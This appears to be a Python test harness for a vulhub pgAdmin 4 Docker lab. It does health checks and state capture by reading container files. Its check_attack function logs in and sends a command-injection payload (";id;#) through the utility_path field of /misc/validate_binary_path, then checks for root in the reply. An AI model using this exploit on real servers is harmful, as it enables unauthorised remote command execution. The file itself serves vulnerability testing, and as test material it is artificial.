import requests
from bs4 import BeautifulSoup  
from basic.server_state import ServerState
from docker import DockerClient
import os
import re    # /settings/save_tree_state


def hc_single(scene) -> bool:
    success = False
    try:
        http_port = scene.target_container['ports'][0]
        response = requests.get(f"http://localhost:{http_port}/login")
        #print(response.text)
        if response.status_code == 200 and "pgAdmin 4" in response.text:
            success = True

    except (StopIteration, requests.RequestException):
        return False
    
    return success

def get_files_and_folders_from_docker(container_name, directory):
    client = DockerClient.from_env()
    container = client.containers.get(container_name)

    check_cmd = f'ls "{directory}"'
    check_result = container.exec_run(check_cmd)
    if check_result.exit_code != 0:
        return []
    
    file_cmd = f'find {directory} -maxdepth 1 -type f'
    files = container.exec_run(file_cmd)
    file_list = files.output.decode().strip().split('\n')
    
    dir_cmd = f'find {directory} -maxdepth 1 -type d ! -path {directory}'
    dirs = container.exec_run(dir_cmd)
    dir_list = dirs.output.decode().strip().split('\n')

    results = []

    for file_path in file_list:
        if not file_path.strip():
            continue
        cat_cmd = f'cat {file_path}'
        file_content = container.exec_run(cat_cmd, demux=True)
        content_bytes = file_content.output[0] if file_content.output else b''
        file_name = os.path.basename(file_path)
        results.append({'file_name': file_name, 'content': content_bytes})

    for dir_path in dir_list:
        if not dir_path.strip():
            continue
        dir_name = os.path.basename(dir_path)
        results.append({'file_name': dir_name, 'content': b''})

    return results

def get_state(container_name: str, http_port: int = 0, db_port: int = 0, save_tag = "demo") -> ServerState:

    from basic.file_data import FileData
    

    file_path = "/var/lib/pgadmin/storage"
    files = get_files_and_folders_from_docker(container_name, file_path)
    file_state = []
    for file in files:
        f = FileData(file_path=file_path, file_name=file['file_name'], file_content=file['content'])
        file_state.append(f)
    
    file_path = "/var/lib/pgadmin/storage/vulhub_example.com"
    files = get_files_and_folders_from_docker(container_name, file_path)
    
    for file in files:
        f = FileData(file_path=file_path, file_name=file['file_name'], file_content=file['content'])
        file_state.append(f)
    gitlab_state = ServerState(file_state=file_state, db_state=[])
    return gitlab_state

def check_attack(http_port: int, container_id: str = "", session: requests.Session = None, db_port: int = 0) -> bool:
    try:
        s = requests.Session()
        target_url = f"http://localhost:{http_port}"
        response = s.get(target_url)
        csrf_token_global = re.search(r'"csrfToken": "(.*?)"', response.text).group(1)  

        login_data = {  
            "csrf_token": csrf_token_global,  
            "email": "vulhub@example.com",  
            "password": "vulhub",  
        }  
        resp = s.post(f"{target_url}/authenticate/login", data=login_data)  

        exploit_data = {  
            "utility_path": f"/var/lib/pgadmin/storage/vulhub_example.com/\";id;#"  
        }
        headers = {  
            "X-pgA-CSRFToken": csrf_token_global,  
            "Content-Type": "application/json"  
        }  
        final_resp = s.post(f"{target_url}/misc/validate_binary_path", json=exploit_data, headers=headers)
        response_json = final_resp.json()
        if "(root)" in response_json["data"]:
            return True
        return False
    except Exception as e:
        return False